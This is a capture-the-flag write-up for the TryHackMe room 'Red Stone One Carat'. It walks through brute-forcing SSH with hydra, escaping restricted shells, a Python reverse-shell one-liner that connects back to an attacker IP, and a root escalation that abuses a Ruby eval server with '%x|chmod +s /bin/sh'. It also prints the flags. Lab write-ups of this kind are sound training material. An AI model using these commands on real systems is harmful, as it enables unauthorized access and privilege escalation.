# Tryhackme.com Room : Red Stone One Carat

`https://tryhackme.com/room/redstoneonecarat`



## SSH access

The challenge ask us to bruteforce the ssh credentials for the user `noraj`

We do so with `hydra`.

After a while, we look at the `hint`. It says that the password contains `bu`.

We `grep "bu" /usr/share/wordlists/rockyou.txt > with_bu` and use this list.

We find the password `cheeseburger`



## Initial Foothold
Able to launch an http server so we can browse the filesystem
```
test.rb Kernel system '/usr/bin/python3 -m http.server'
```
We can retrieve the `user.txt` this way but let's figure out a way to get a reverse shell.

We get permission denied with :
```
'/usr/bin/python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",5243));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"'"
```
This is because the user `noraj` doesn't have permissions to `/bin/bash`

We get a reverse shell with
```
'/usr/bin/python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",5243));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"'"
```

The `$PATH` is set to `/home/noraj/bin` so we don't have access to any commands. Let's fix this
```
export PATH='/usr/sbin;/usr/local/sbin:/usr/local/bin:/usr/bin:/bin'
```

And we can now `ls` and friends.
Still, we don't have permission for a bunch of binaries :
```
cat
grep
netstat
ss
````

We can read files using 
```
python3 -c 'print(open("/home/noraj/user.txt","r").read())'
```
not super user friendly tho.

`/home/noraj/user.txt` :
```
THM{3a106092635945849a0fbf7bac92409d}
```


## Priv Esc
There is a hint file in `/home/noraj/.hint.txt`
```
Maybe take a look at local services.
```

We check if some ports are open using `lsof -i -P -n` but we don't see anything (Probably need root access to see the interesting ports)

running `systemctl` we see that there is a `dummy.service` that is `inactive/failed`
We retrieve the content of its config with
```
python3 -c 'print(open("/etc/systemd/system/dummy.service","r").read())'
```
We get 
```
[Unit]
Description=Dummy apps
# After=network.target

[Service]
User=vagrant
Type=forking
ExecStart=/dummy.sh

[Install]
WantedBy=multi-user.target
```

The `/dummy.sh` script contains :
```
#!/bin/bash

# Start dummy listeners
for i in $(seq 30000 31000)
do
    if [ $i = 31547 ]
    then
        echo $i
    else
        nc -nlp $i -s 127.0.0.1 &
    fi
done
```

We don't have write access to either the config file or `dummy.sh`. Hmm, not sure how to exploit this.

There is another service owned by the user `vagrant` defined in `/etc/systemd/system/root-app.service` :
```
[Unit]
Description=Root app
# After=network.target

[Service]
User=root                                             
ExecStart=/usr/bin/ruby /root/server.rb
Restart=on-failure

[Install]                                          
WantedBy=multi-user.target
```

After some tinkering with the service files, I finally realised that `dummy.sh` is only there to give us the hint that `server.rb` is running on port `31547`. (Actually found out using `nc -n -v 127.0.0.1 1-65535`)
When we connect to it using `/bin/nc -v 127.0.0.1 31547` we get a "shell".
It's a somewhat restricted `ruby` shell.
There is a bunch of forbidden characters :
```
.
"
'
(
)
`
```

We find that we can execute shell commands using
```
%x|chmod +s /bin/sh
```

We break out of the ruby cmd line by entering an invalid character (such as `%`)
We can then launch a root shell using `/bin/sh -p`

We get the flag `/root/root.txt` :
```
THM{58e53d1324eef6265fdb97b08ed9aadf}
```

For completeness, here is `/root/server.rb` :
```
cat server.rb
require 'socket'

server = TCPServer.new 'localhost', 31547

begin
  while client = server.accept
    client.print '$ '
    while line = client.gets
      if /[\`\(\)\[\]\.\'\"\<\>]+/.match?(line)
        client.puts 'Forbidden character'
      elsif /exit/i.match?(line)
        break
      else
        begin
          client.puts eval(line)
        rescue NameError => e
          client.puts e
        end
      end
      client.print '$ '
    end
    client.puts "Closing the client. Bye!\n"
    client.close
    #server.close
  end
rescue Errno::ECONNRESET, Errno::EPIPE => e
  puts e.message
  retry
end
```

## Wrap up
* This challenge was different then what i'm used to. There was a lot of restrictions on the commands that can be used. First the restricted `zsh` shell, then the `test.rb` script, then even our reverse shell was missing a lot of commands. Finally the `server.rb` was restricting a lot of stuff.
* I wasted time getting the reverse shell in the beginning because I didn't understand right away why I received a `permission denied` when launching my reverse shell. After changing to `/bin/sh` everything was fine.
* After that, I wasted some time trying to exploit `/etc/systemd/system/dummy.service`. Trying to highjack the `nc` binary. I didn't get the hint that since it wasn't creating a listener on port `31547`, this was probably the port that was running the `server.rb`.
** Actually, I though that it would have been an `http` server. So at first I crafted a little python script that would do a GET request to all ports. When this failed, I did a port scan with `nc -v -n 127.0.0.1 1-65535` and this is how I discovered port `31547`.
* Did learn a bit of ruby and a bit more about file permissions.

